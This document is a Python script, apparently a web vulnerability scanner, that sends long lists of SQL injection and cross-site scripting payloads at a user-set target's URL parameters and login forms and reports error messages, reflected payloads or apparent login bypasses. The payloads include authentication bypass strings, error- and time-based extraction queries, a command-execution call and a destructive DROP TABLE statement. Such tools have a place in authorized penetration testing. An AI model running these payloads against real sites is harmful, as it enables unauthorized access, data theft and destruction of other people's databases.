import requests
from bs4 import BeautifulSoup

# --- CONFIGURATION (user-modifiable) ---
TARGET_URL = "http://x.x.x.x"  # Replace with your target URL

# SQLi payloads (classic, advanced, and filter bypass)
SQLI_PAYLOADS = [
    "' OR 1=1-- ", "' OR '1'='1'--", "' OR 'a'='a", "' OR 1=1#", "' OR 1=1/*",
    "admin'--", "admin'#", "admin'/*", "'; EXEC xp_cmdshell('dir')--",
    "' UNION SELECT null, version()--",
    "' UNION SELECT null, table_name FROM information_schema.tables--",
    "'; DROP TABLE users--", "'; SELECT * FROM users--",
    "' OR 1=1 LIMIT 1--", "' OR 1=1 OFFSET 1--",
    "' OR 1=1 -- ", "' OR 1=1 -- -", "' OR 1=1 --+",
    "'%20OR%20'1'='1'--", "'/**/OR/**/'1'='1'--", "'||'1'='1'--",
    "' OR 1=1-- -", "' OR 1=1--+", "' OR 1=1#%0A",
    "' OR 1=1/*!50000UNION*/ SELECT 1,2,3--",
    "' OR (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT database()), FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) y)--",
    "' OR 1=1 AND 1=CONVERT(int, (SELECT table_name FROM information_schema.tables))--",
    "' OR 1=1 AND 1=0 UNION SELECT null, version()--",
    "' OR 1=1 AND EXTRACTVALUE(1, CONCAT(0x5C, (SELECT database())))--",
    "' OR 1=1 AND UPDATEXML(1, CONCAT(0x5C, (SELECT database())), 1)--",
    "' OR 1=1 AND ROW(1,1)>(SELECT COUNT(*), CONCAT((SELECT database()), FLOOR(RAND(0)*2)) FROM information_schema.tables GROUP BY x)--",
    "' OR IF(1=1,SLEEP(5),0)--", "' OR (SELECT 1 FROM (SELECT SLEEP(5))x)--",
    "' OR BENCHMARK(5000000,MD5('test'))--",
    "' OR 1=1 AND SUBSTRING(@@version,1,1)='5'--",
    "' OR 1=1 AND (SELECT 1 FROM dual WHERE database() LIKE '%')--",
    "' OR 1=1 AND GTID_SUBSET(CONCAT(0x7e,(SELECT @@version),0x7e),1)--",
    "' OR 1=1 AND EXTRACTVALUE(1,CONCAT(0x5C,(SELECT @@version)))--",
]

# XSS payloads (classic, advanced, and filter bypass)
XSS_PAYLOADS = [
    "<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>", "'><script>alert(1)</script>",
    "\" onmouseover=\"alert(1)", "<iframe src=\"javascript:alert(1)\">",
    "<body onload=alert(1)>", "<input type=\"text\" value=\"\" onfocus=\"alert(1)\" autofocus>",
    "javascript:alert(1)", "<a href=\"javascript:alert(1)\">click</a>", "{{7*7}}",
    "<img/src=x onerror=alert(1)>", "<img src=x onerror=prompt(1)>",
    "<details open ontoggle=alert(1)>", "<img src=x onerror=confirm(1)>",
    "<img src=x onerror=eval('alert(1)')>", "<img src=x onerror=String.fromCharCode(97,108,101,114,116,40,49,41)>",
    "<img src=x onerror=window['alert'](1)>", "<img src=x onerror=top['alert'](1)>",
    "<img src=x onerror=alert`1`>", "<img src=x onerror=alert(1)>",
    "<img src=x onerror=alert(/1/)>", "<img src=x onerror=alert(document.domain)>",
    "&lt;script&gt;alert(1)&lt;/script&gt;", "%3Cscript%3Ealert(1)%3C%2Fscript%3E",
    "\x3Cscript\x3Ealert(1)\x3C/script\x3E", "<img src=x onerror=\u0061\u006C\u0065\u0072\u0074(1)>",
    "<img src=x onerror=eval('al'+'ert(1)')>", "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<div onmouseover=alert(1)>Hover me</div>", "<div onmouseenter=alert(1)>Hover me</div>",
    "<div onclick=alert(1)>Click me</div>", "<div onload=alert(1)>Load me</div>",
    "<style onload=alert(1)>", "<link rel=stylesheet href=x onerror=alert(1)>",
    "<svg><script>alert(1)</script></svg>", "<svg onload=alert(1)>",
    "<object data=javascript:alert(1)>", "<embed src=javascript:alert(1)>",
    "<video src=x onerror=alert(1)>", "<audio src=x onerror=alert(1)>",
    "{{'7'*'7'}}", "{% set x=alert(1) %}", "${7*7}", "#{7*7}", "<%= 7*7 %>",
]

# --- FUNCTIONS ---
def is_login_successful(response):
    # Check HTTP status code and absence of error messages
    if response.status_code in [200, 302]:
        error_keywords = ["error", "failed", "invalid", "wrong", "denied", "SQL syntax"]
        if not any(keyword in response.text.lower() for keyword in error_keywords):
            # Also check for session cookies
            session_cookies = ["PHPSESSID", "sessionid", "user", "auth"]
            if any(cookie in response.cookies for cookie in session_cookies):
                return True
            return True
    return False

def test_sqli_in_url(url):
    print("\n[+] Testing SQLi in URL parameters...")
    try:
        if "?" in url:
            base_url, params = url.split("?", 1)
            for payload in SQLI_PAYLOADS:
                for param in params.split("&"):
                    if "=" in param:
                        key, _ = param.split("=", 1)
                        new_params = params.replace(param, f"{key}={payload}")
                        test_url = f"{base_url}?{new_params}"
                        try:
                            r = requests.get(test_url, timeout=5)
                            if any(err in r.text for err in ["SQL syntax", "error in your SQL", "mysql_fetch", "syntax error", "unclosed quotation mark"]):
                                print(f"[!] Possible SQLi vulnerability with: {test_url}")
                            else:
                                print(f"[-] No SQLi detected with: {payload}")
                        except Exception as e:
                            print(f"[!] Error testing {test_url}: {e}")
        else:
            print("[-] No parameters in URL to test SQLi.")
    except Exception as e:
        print(f"[!] Error during SQLi URL test: {e}")

def test_xss_in_url(url):
    print("\n[+] Testing XSS in URL parameters...")
    try:
        if "?" in url:
            base_url, params = url.split("?", 1)
            for payload in XSS_PAYLOADS:
                for param in params.split("&"):
                    if "=" in param:
                        key, _ = param.split("=", 1)
                        new_params = params.replace(param, f"{key}={payload}")
                        test_url = f"{base_url}?{new_params}"
                        try:
                            r = requests.get(test_url, timeout=5)
                            if payload in r.text:
                                print(f"[!] Possible XSS vulnerability with: {test_url}")
                            else:
                                print(f"[-] No XSS detected with: {payload}")
                        except Exception as e:
                            print(f"[!] Error testing {test_url}: {e}")
        else:
            print("[-] No parameters in URL to test XSS.")
    except Exception as e:
        print(f"[!] Error during XSS URL test: {e}")

def find_forms(url):
    try:
        r = requests.get(url, timeout=5)
        soup = BeautifulSoup(r.text, 'html.parser')
        forms = soup.find_all('form')
        print(f"\n[+] Found {len(forms)} forms on the page.")
        return forms
    except Exception as e:
        print(f"[!] Error finding forms: {e}")
        return []

def test_form(form, url):
    form_details = {}
    action = form.attrs.get("action", "").strip()
    method = form.attrs.get("method", "get").lower()
    inputs = []
    for input_tag in form.find_all('input'):
        input_type = input_tag.attrs.get("type", "text")
        input_name = input_tag.attrs.get("name")
        if input_name:
            inputs.append({"type": input_type, "name": input_name})
    form_details['action'] = action
    form_details['method'] = method
    form_details['inputs'] = inputs
    return form_details

def build_target_url(url, action):
    if action.startswith('http'):
        return action
    if not url.endswith('/') and not action.startswith('/'):
        return f"{url}/{action}"
    return f"{url}{action}"

def test_sqli_in_form(form_details, url):
    print("\n[+] Testing SQLi in form...")
    target_url = build_target_url(url, form_details['action'])
    for payload in SQLI_PAYLOADS:
        data = {input_tag['name']: payload for input_tag in form_details['inputs']}
        try:
            if form_details['method'] == "post":
                r = requests.post(target_url, data=data, timeout=10, allow_redirects=True)
            else:
                r = requests.get(target_url, params=data, timeout=10, allow_redirects=True)
            if is_login_successful(r):
                print(f"[!] Possible SQLi vulnerability (successful login) with: {data}")
            else:
                print(f"[-] No SQLi detected with: {payload}")
        except Exception as e:
            print(f"[!] Error testing SQLi with {payload}: {e}")

def test_xss_in_form(form_details, url):
    print("\n[+] Testing XSS in form...")
    target_url = build_target_url(url, form_details['action'])
    for payload in XSS_PAYLOADS:
        data = {input_tag['name']: payload for input_tag in form_details['inputs']}
        try:
            if form_details['method'] == "post":
                r = requests.post(target_url, data=data, timeout=5, allow_redirects=True)
            else:
                r = requests.get(target_url, params=data, timeout=5, allow_redirects=True)
            if payload in r.text:
                print(f"[!] Possible XSS vulnerability in form with: {data}")
            else:
                print(f"[-] No XSS detected with: {payload}")
        except Exception as e:
            print(f"[!] Error testing XSS with {payload}: {e}")

# --- EXECUTION ---
if __name__ == "__main__":
    print(f"[*] Starting scan on: {TARGET_URL}")
    test_sqli_in_url(TARGET_URL)
    test_xss_in_url(TARGET_URL)
    forms = find_forms(TARGET_URL)
    for form in forms:
        form_details = test_form(form, TARGET_URL)
        test_sqli_in_form(form_details, TARGET_URL)
        test_xss_in_form(form_details, TARGET_URL)
    print("\n[*] Scan completed.")
